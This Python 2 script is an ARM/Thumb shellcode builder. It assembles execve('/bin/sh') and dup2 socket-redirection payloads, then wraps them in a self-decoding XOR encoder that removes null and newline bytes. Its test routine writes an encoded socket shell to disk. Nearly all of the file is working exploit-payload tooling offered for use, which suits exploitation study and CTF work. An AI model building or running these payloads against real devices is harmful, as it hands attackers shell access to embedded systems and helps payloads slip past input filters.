#!python
import os
import sys
import tempfile

__VERSION__ = '$0.0.2'
__AUTHOR__  = 'alex.park'

# Assembler 
BIN_AS = '/usr/bin/arm-linux-gnueabi-as'
ALTER_BIN_AS = 'as'
# Linker
BIN_LD = '/usr/bin/arm-linux-gnueabi-ld'
ALTER_BIN_LD = 'ld'
# Objcopy
BIN_OC = '/usr/bin/arm-linux-gnueabi-objcopy'
ALTER_BIN_OC = 'objcopy'
# RAW Shellcode
RAW_SC = 'raw_sc'

def SYSERR(m):
    print >> sys.stderr, "%s" % (m)

def cleanup(fn):
    for f in fn:
        if os.path.exists(f) == True:
            try:
                os.unlink(f)
            except:
                pass

def prepareCompiler():
    global BIN_AS
    global BIN_LD
    global BIN_OC

    if os.path.exists(BIN_AS) == False:
        BIN_AS = ALTER_BIN_AS

    if os.path.exists(BIN_LD) == False:
        BIN_LD = ALTER_BIN_LD

    if os.path.exists(BIN_OC) == False:
        BIN_OC = ALTER_BIN_OC

def CompileSC(source, isThumb=False, isNeedHead=True):
    ASM_HEAD = """
    .global _start
    .section .text
    _start:
    """

    ASM_THUMB = """
    .arm
    add r6, pc, #1
    bx r6
    .thumb
    """

    fn = tempfile.mktemp() # binary file
    fn_s = fn + '.s' # as file
    fn_o = fn + '.o' # ld file
    fn_raw = fn + '.raw' # objcopy 
    will_be_deleted = [fn, fn_s, fn_o, fn_raw]

    src = ''
    if isNeedHead:
        src += ASM_HEAD + '\n'

    #if isThumb:
    #    src += ASM_THUMB + '\n'

    src += source
    # write a source
    open(fn_s, 'w').write(src)

    # compile a source
    if isThumb:
        COMPILE = '%s %s -o %s -mthumb' % (BIN_AS, fn_s, fn_o)
    else:
        COMPILE = '%s %s -o %s' % (BIN_AS, fn_s, fn_o)
    os.system(COMPILE)
    if os.path.exists(fn_o) == False:
        print "Failed to compile a source: %s" % (fn_s)
        cleanup(will_be_deleted)
        return ""

    # link an object
    LINKING = '%s %s -o %s' % (BIN_LD, fn_o, fn)
    os.system(LINKING)
    if os.path.exists(fn_o) == False:
        print "Failed to link an object: %s" % (fn_o)
        cleanup(will_be_deleted)
        return ""

    # objcopy 
    OBJCOPY = '%s -I elf32-little -j .text -O binary %s %s' % (BIN_OC, fn, fn_raw)
    os.system(OBJCOPY)
    if os.path.exists(fn_raw) == False:
        print "Failed to make a raw file: %s" % (fn)
        cleanup(will_be_deleted)
        return ""

    f = open(fn_raw,'rb').read()
    cleanup(will_be_deleted)

    return f

def printHex(xhex):
    xtmp = ''
    xhex = xhex.encode('hex')
    for x in range(0, len(xhex), 2):
        xtmp += '\\x' + xhex[x:x+2]

    return xtmp

def XOREncoder(scSize, xorkey, SC):
    MAX_SC_SIZE = 256
    LOOP_SC_SIZE = MAX_SC_SIZE - scSize

    sc="""
    adr r8, scode

main:
    mov r4, #%s
    adr r6, nanosleep

loop:
    cmp  r4, #%s
    bxhi r6
    sub  r4, r4, #%s
    ldrb r5, [r8, r4]
    eor  r5, r5, #%s
    strb r5, [r8, r4]
    add  r4, r4, #%s

backloop:
    b loop
backmain:
    bl main

nanosleep:
    .arm
    add r6, pc, #1
    bx r6
    .thumb
nanosleep2:
    sub r5, r5, r5
    add r5, r5, #1
    sub r6, r6, r6
    push {r5, r6}
    push {r5, r6}
    mov r0, sp
    mov r1, sp
    mov r7, #162
    svc 1

scode:
    .asciz "%s"
    """ % (LOOP_SC_SIZE, MAX_SC_SIZE, LOOP_SC_SIZE, xorkey, LOOP_SC_SIZE+1, printHex(SC))

    return sc

def findXorKey(sc, bc=['\x00', '\x0a']):
    """find XOR key to scramble and to avoid all of bad chars such as 0x00
        arg:
            sc (str): shellcode
            bc (list): bad chars to avoid

        return:
            key (int): XOR key

        Examples:
            >>> print findXorKey(sc)
            2
    """
    size = len(sc)
    bcs  = bc
    for i in range(0x01, 0xFF+1):
        key = i
        for s in sc:
            x = (ord(s) ^ i)
            if chr(x) in bcs:
                key = -1
                break
        if key != -1:
            return key
    return -1


def encodeShellcode(sc, key):
    """encodes shellcode with key to avoid all of bad chars such as 0x00
        arg:
            sc (str)     : shellcode
            key (int/str): XOR key

        return:
            xoredSC (str): XORed Shellcode

        Examples:
            >>> print encodeShellcode(sc, findXorKey(sc))
            '\x0e\x02\x8d\xe0\x02"\xa2\xe1\x07\x02/\xeb\x0f\x12\xa2\xe3\t\x02\x92\xed-`kl-qj\x02'
    """

    xsc = ''
    for i in range(0, len(sc)):
        xsc += chr( ord(sc[i]) ^ key )
    
    return xsc

def checkBadChar(sc, bc=[0x00, 0x0a]):
    from collections import defaultdict
    bcs = defaultdict(int)
    size = len(sc)
    for s in sc:
        if s in bc:
            bcs[s] += 1

    return bcs

######################
## ARM Mode Shellcodes
######################

# /bin/sh 
def ARM_SH(binsh='/bin/sh'):
    sc = """
    adr r0, bin_sh_1
    mov r2, #0
    push {r0, r2}
    mov r1, sp
    svc (0x900000+ 11)
bin_sh_1:
    .asciz "%s"
    """ % (binsh) # sometimes we have to change to specific things like id
    return sc

# dup() in ARM Mode
def ARM_DUP(sock=4):
    sc = """
    mov r9, #%s
    mov r8, #2
loop_2:
    mov r0, r9
    mov r1, r8
    svc (0x900000+ 63)
    adds r8, #-1
bpl loop_2
    """ % (sock)

    return sc

# dupsh()
def ARM_DUPSH(sock=4, binsh='/bin/sh'):
    sc = ARM_DUP(sock)
    sc += ARM_SH(binsh)
    return sc

def MakeXorShellcode(sc, isThumb=False):
    key = findXorKey(sc)
    if key == -1:
        SYSERR("Failed to find xor key")
        return ""

    xorsc  = encodeShellcode(sc, key)
    xorenc = XOREncoder(len(xorsc), key, xorsc)
    rv = checkBadChar(xorenc)
    if len(rv) != 0:
        SYSERR("!!! Bad char has been found in shellcode. Please check out")
        return ""

    return CompileSC(xorenc, isThumb=isThumb)

########################
## Thumb Mode Shellcodes
########################

# /bin/sh
def ARM_THUMB_SH(sh='/bin/sh'):
    sc = """
    mov r0, pc
    add r0, #10
    movs r2, #0
    movs r7, #(0+ 11)
    push {r0, r2}
    mov r1, sp
    svc 1
bin_sh_1:
    .asciz "%s\x00"
    """ % (sh)
    return sc

def ARM_THUMB_DUP(sock=4):
    sc = """
    movs r1, #3
    movs r7, #(0+ 63)
    sub r2, r2, r2
    movs r5, #%s
loop_2:
    mov  r0, r5
    sub  r1, r1, #1
    svc  1
    cmp  r1, r2
    bne  loop_2
    """ % (sock)
    return sc

def ARM_THUMB_DUPSH(sock=4, sh='/bin/sh'):
    sc = ARM_THUMB_DUP(sock)
    sc += ARM_THUMB_SH(sh)
    return sc

# Placeholder 
def ARM_PLACEHOLDER():
    sc = """
    """
    return sc

def Test():
    # ARM
    #xsc = CompileSC(ARM_DUP(4) + ARM_SH('/usr/bin/id'))
    #xsc = CompileSC(ARM_DUPSH(sock=4))
    #xorsc = MakeXorShellcode(xsc)

    # THUMB
    #xsc = CompileSC(ARM_THUMB_SH('/usr/bin/id'), isThumb=True)
    xsc = CompileSC(ARM_THUMB_DUPSH(sock=4), isThumb=True)
    xsc = MakeXorShellcode(xsc)
    open('raw_sc', 'wb').write(xsc)

if __name__ == '__main__':
    prepareCompiler()
    Test()
